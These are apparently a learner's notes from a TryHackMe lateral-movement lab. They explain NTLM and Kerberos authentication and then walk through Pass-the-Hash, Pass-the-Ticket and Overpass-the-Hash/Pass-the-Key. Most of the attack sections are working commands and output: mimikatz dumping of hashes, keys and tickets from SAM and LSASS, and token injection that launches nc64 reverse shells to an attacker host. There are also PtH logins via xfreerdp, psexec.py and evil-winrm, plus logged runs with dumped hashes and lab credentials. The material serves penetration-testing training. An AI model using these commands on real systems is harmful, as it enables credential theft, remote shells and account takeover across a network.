By alternate authentication material, we refer to any piece of data that can be used to access a Windows account without actually knowing a user's password itself. This is possible because of how some authentication protocols used by Windows networks work. In this task, we will take a look at a couple of alternatives available to log as a user when either of the following authentication protocols is available on the network:
- NTLM authentication
- Kerberos authentication
- 
**Note:** During this task, you are assumed to be familiar with the methods and tools to extract credentials from a host. Mimikatz will be used as the tool of choice for credential extraction throughout the room.

# NTLM Authentication
Before diving into the actual lateral movement techniques, let's take a look at how NTLM authentication works:
![](Pasted%20image%2020241116201524.png)
Steps:
1. The client sends an authentication request to the server they want to access.
2. The server generates a random number and sends it as a challenge to the client.
3. The client combines his NTLM password hash with the challenge (and other known data) to generate a response to the challenge and sends it back to the server for verification.
4. The server forwards both the challenge and the response to the Domain Controller for verification.
5. The domain controller uses the challenge to recalculate the response and compares it to the initial response sent by the client. If they both match, the client is authenticated; otherwise, access is denied. The authentication result is sent back to the server.
6. The server forwards the authentication result to the client.

**Note:**
	 The described process applies when using a domain account. If a local account is used, the server can verify the response to the challenge itself without requiring interaction with the domain controller since it has the password hash stored locally on its SAM.


## Pass-the-Hash
As a result of extracting credentials from a host where we have attained administrative privileges (by using mimikatz or similar tools), we might get clear-text passwords or hashes that can be easily cracked. However, if we aren't lucky enough, we will end up with non-cracked NTLM password hashes.

Although it may seem we can't really use those hashes, the NTLM challenge sent during authentication can be responded to just by knowing the password hash. This means we can authenticate without requiring the plaintext password to be known. Instead of having to crack NTLM hashes, if the Windows domain is configured to use NTLM authentication, we can **Pass-the-Hash** (PtH) and authenticate successfully.

To extract NTLM hashes, we can either use mimikatz to read the local SAM or extract hashes directly from LSASS memory.

### Extracting NTLM hashes from local SAM:
This method will only allow you to get hashes from local users on the machine. No domain user's hashes will be available.

THMJMP2: Powershell
```shell-session
mimikatz # privilege::debug
mimikatz # token::elevate

mimikatz # lsadump::sam   
RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 145e02c50333951f71d13c245d352b50
```

### Extracting NTLM hashes from LSASS memory:
This method will let you extract any NTLM hashes for local users and any domain user that has recently logged onto the machine.

THMJMP2: Powershell
```shell-session
mimikatz # privilege::debug
mimikatz # token::elevate

mimikatz # sekurlsa::msv 
Authentication Id : 0 ; 308124 (00000000:0004b39c)
Session           : RemoteInteractive from 2 
User Name         : bob.jenkins
Domain            : ZA
Logon Server      : THMDC
Logon Time        : 2022/04/22 09:55:02
SID               : S-1-5-21-3330634377-1326264276-632209373-4605
        msv :
         [00000003] Primary
         * Username : bob.jenkins
         * Domain   : ZA
         * NTLM     : 6b4a57f67805a663c818106dc0648484
```

We can then use the extracted hashes to perform a PtH attack by using mimikatz to inject an access token for the victim user on a reverse shell (or any other command you like) as follows:
```shell-session
mimikatz # token::revert
mimikatz # sekurlsa::pth /user:{bob.jenkins} /domain:{za.tryhackme.com} /ntlm:{6b4a57f67805a663c818106dc0648484} /run:"c:\tools\nc64.exe -e cmd.exe {ATTACKER_IP} {5555}"
```

*Note*:*
	We used `token::revert` to reestablish our original token privileges, as trying to pass-the-hash with an elevated token won't work.

This would be the equivalent of using `runas /netonly` but with a hash instead of a password and will spawn a new reverse shell from where we can launch any command as the victim user.

To receive the reverse shell, we should run a reverse listener on our attacking machine:
```shell-session
user@AttackBox$ nc -lvp 5555
```

*Note:*
	If you run the whoami command on this shell, it will still show you the original user you were using before doing PtH, but any command run from here will actually use the credentials we injected using PtH.


### Passing the Hash Using Linux:
If you have access to a linux box several tools have built-in support to perform PtH using different protocols. Depending on which services are available to you, you can do the following:

- _Connect to RDP using PtH:_
```shell-session
xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH
```

- _Connect via psexec using PtH:_
```shell-session
psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP
```

- _Connect to WinRM using PtH:_
```shell-session
evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH
```

# Kerberos Authentication
Let's have a quick look at how Kerberos authentication works on Windows networks:

1. The user sends his username and a timestamp encrypted using a key derived from his password to the **Key Distribution Center (KDC)**, a service usually installed on the Domain Controller in charge of creating Kerberos tickets on the network.
    
    The KDC will create and send back a **Ticket Granting Ticket (TGT)**, allowing the user to request tickets to access specific services without passing their credentials to the services themselves. Along with the TGT, a **Session Key** is given to the user, which they will need to generate the requests that follow.
    
    Notice the TGT is encrypted using the **krbtgt** account's password hash, so the user can't access its contents. It is important to know that the encrypted TGT includes a copy of the Session Key as part of its contents, and the KDC has no need to store the Session Key as it can recover a copy by decrypting the TGT if needed.
    ![](Pasted%20image%2020241116212526.png)
2. When users want to connect to a service on the network like a share, website or database, they will use their TGT to ask the KDC for a **Ticket Granting Service (TGS)**. TGS are tickets that allow connection only to the specific service for which they were created. To request a TGS, the user will send his username and a timestamp encrypted using the Session Key, along with the TGT and a **Service Principal Name (SPN),** which indicates the service and server name we intend to access.
    
    As a result, the KDC will send us a TGS and a **Service Session Key**, which we will need to authenticate to the service we want to access. The TGS is encrypted using the **Service Owner Hash**. The Service Owner is the user or machine account under which the service runs. The TGS contains a copy of the Service Session Key on its encrypted contents so that the Service Owner can access it by decrypting the TGS.
    ![](Pasted%20image%2020241116212554.png)
3. The TGS can then be sent to the desired service to authenticate and establish a connection. The service will use its configured account's password hash to decrypt the TGS and validate the Service Session Key.
	![](Pasted%20image%2020241116212618.png)

## Pass-the-Ticket
Sometimes it will be possible to extract Kerberos tickets and session keys from LSASS memory using mimikatz. The process usually requires us to have SYSTEM privileges on the attacked machine and can be done as follows:
```shell-session
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
```

*Note*:
	Notice that if we only had access to a ticket but not its corresponding session key, we *wouldn't be able* to use that ticket; therefore, both are necessary.

While mimikatz can extract any *TGT* or *TGS* available from the memory of the *LSASS* process, most of the time, *we'll be interested in TGTs* as they can be used to *request access to any services the user is allowed to access*. At the same time, *TGSs are only good for a specific service*. Extracting *TGTs will require us to have administrator's credentials*, and extracting *TGSs can be done with a low-privileged account* (only the ones assigned to that account).

Once we have extracted the desired ticket, we can inject the tickets into the current session with the following command:
```shell-session
mimikatz # kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-{ZA.TRYHACKME.COM}.kirbi
```

*Injecting tickets in our own session doesn't require administrator privileges*. After this, the tickets will be available for any tools we use for lateral movement. To check if the tickets were correctly injected, you can use the `klist` command:

THMJMP2: Powershell
```shell-session
za\bob.jenkins@THMJMP2 C:\> klist

Current LogonId is 0:0x1e43562

Cached Tickets: (1)

#0>     Client: Administrator @ ZA.TRYHACKME.COM
        Server: krbtgt/ZA.TRYHACKME.COM @ ZA.TRYHACKME.COM
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 4/12/2022 0:28:35 (local)
        End Time:   4/12/2022 10:28:35 (local)
        Renew Time: 4/23/2022 0:28:35 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called: THMDC.za.tryhackme.com
```

## Overpass-the-hash / Pass-the-Key
This kind of attack is similar to PtH but applied to Kerberos networks.

When a user requests a TGT, they send a timestamp encrypted with an encryption key derived from their password. The algorithm used to derive this key can be either DES (disabled by default on current Windows versions), RC4, AES128 or AES256, depending on the installed Windows version and Kerberos configuration. If we have any of those keys, we can ask the KDC for a TGT without requiring the actual password, hence the name **Pass-the-key (PtK)**.

We can obtain the Kerberos encryption keys from memory by using mimikatz with the following commands:
```shell-session
mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys
```

Depending on the available keys, we can run the following commands on mimikatz to get a reverse shell via Pass-the-Key:

- **If we have the RC4 hash:**
```shell-session
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```

- **If we have the AES128 hash:**
```shell-session
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```

- **If we have the AES256 hash:**
```shell-session
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```

*Note:*
	When using **RC4**, the *key will be equal to the NTLM hash of a user*. This means that *if we could extract the NTLM hash, we can use it to request a TGT* as long as RC4 is one of the enabled protocols. This particular variant is usually known as **Overpass-the-Hash (OPtH)**.

To receive the reverse shell, we should run a reverse listener on our attacking machine:
```shell-session
user@AttackBox$ nc -lvp 5556
```

*Note:*
	Just as with PtH, any command run from this shell will use the credentials injected via mimikatz.


# Example
To begin this exercise, you will need to connect to THMJMP2 using the following credentials via SSH:
	**User:** ZA.TRYHACKME.COM\t2_felicia.dean
	**Password**: iLov3THM!

`ssh za\\t2_felicia.dean@thmjmp2.za.tryhackme.com`

These credentials will grant you administrative access to THMJMP2, allowing you to use mimikatz to dump the authentication material needed to perform any of the techniques presented during this task.

Using your SSH session, use mimikatz to extract authentication material and perform Pass-the-Hash, Pass-the-Ticket or Pass-the-Key against domain user `t1_toby.beck`.

Once you have a command prompt with his credentials loaded, use `winrs` to connect to a command prompt on THMIIS. Since t1_toby.beck's credentials are already injected in your session as a result of any of the attacks, you can use winrs without specifying any credentials, and it will use the ones available to your current session:
```shell-session
winrs.exe -r:THMIIS.za.tryhackme.com cmd
```

Windows Remote Management (WinRM) is a web-based protocol *used to send Powershell commands to Windows hosts* remotely. Most *Windows Server installations have WinRM enabled by default*, making it an attractive attack vector.
```
winrs.exe -u:{Administrator} -p:{Mypass123} -r:target cmd
```



***Pass-The-Ticket***

- export  tickets using mimikatz
```shell-session
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
```

- after extracting admin ticket we will pass it in the current mimikatz session
  - we will use winrs to connect remotely
```

mimikatz # kerberos::ptt [0;b6a71]-2-0-40e10000-t1_toby.beck1@krbtgt-ZA.TRYHACKM
E.COM.kirbi                                                                     

* File: '[0;b6a71]-2-0-40e10000-t1_toby.beck1@krbtgt-ZA.TRYHACKME.COM.kirbi': OK


mimikatz # ^C                                                                   
za\t2_felicia.dean@THMJMP2 C:\tools>klist                                       

Current LogonId is 0:0x12f209                                                   

Cached Tickets: (1)                                                             

#0>     Client: t1_toby.beck1 @ ZA.TRYHACKME.COM                                
        Server: krbtgt/ZA.TRYHACKME.COM @ ZA.TRYHACKME.COM                      
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96                    
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent nam
e_canonicalize                                                                  
        Start Time: 11/18/2024 2:09:53 (local)                                  
        End Time:   11/18/2024 12:09:53 (local)                                 
        Renew Time: 11/25/2024 2:09:53 (local)                                  
        Session Key Type: AES-256-CTS-HMAC-SHA1-96                              
        Cache Flags: 0x1 -> PRIMARY                                             
        Kdc Called:                                                             

za\t2_felicia.dean@THMJMP2 C:\tools>winrs.exe -r:THMIIS.za.tryhackme.com cmd    
Microsoft Windows [Version 10.0.17763.1098]                                     
(c) 2018 Microsoft Corporation. All rights reserved.                            

C:\Users\t1_toby.beck1>hostname                                                 
hostname                                                                        
THMIIS                                                                          

C:\Users\t1_toby.beck1>                                                         
```

***Pass the Hash***
```
mimikatz # privilege::debug 
mimikatz # token::elevate 
mimikatz # sekurlsa::msv
```

```
Authentication Id : 0 ; 649970 (00000000:0009eaf2)                              
Session           : RemoteInteractive from 4                                    
User Name         : t1_toby.beck                                                
Domain            : ZA                                                          
Logon Server      : THMDC                                                       
Logon Time        : 11/18/2024 2:09:42 AM                                       
SID               : S-1-5-21-3330634377-1326264276-632209373-4607               
        msv :                                                                   
         [00000003] Primary                                                     
         * Username : t1_toby.beck                                              
         * Domain   : ZA                                                        
         * NTLM     : 533f1bd576caa912bdb9da284bbc60fe                          
         * SHA1     : 8a65216442debb62a3258eea4fbcbadea40ccc38                  
         * DPAPI    : d9cd92937c7401805389fbb51260c45f  
```

```
mimikatz # token::revert
mimikatz # sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /ntlm:533f1bd576caa912bdb9da284bbc60fe /run:"c:\tools\nc64.exe -e cmd.exe 10.50.77.208 4443
"                                                                         
```

```
root@ip-10-10-18-193:~# nc -lvp 4443
Listening on [0.0.0.0] (family 0, port 4443)
Connection from ip-10-200-78-249.eu-west-1.compute.internal 56143 received!
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
za\t2_felicia.dean

C:\Windows\system32>hostname
hostname
THMJMP2

C:\Windows\system32>winrs.exe -r:THMIIS.za.tryhackme.com cmd
winrs.exe -r:THMIIS.za.tryhackme.com cmd
Microsoft Windows [Version 10.0.17763.1098]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\t1_toby.beck>whoami
whoami
za\t1_toby.beck

C:\Users\t1_toby.beck>hostname
hostname
THMIIS

C:\Users\t1_toby.beck>
```

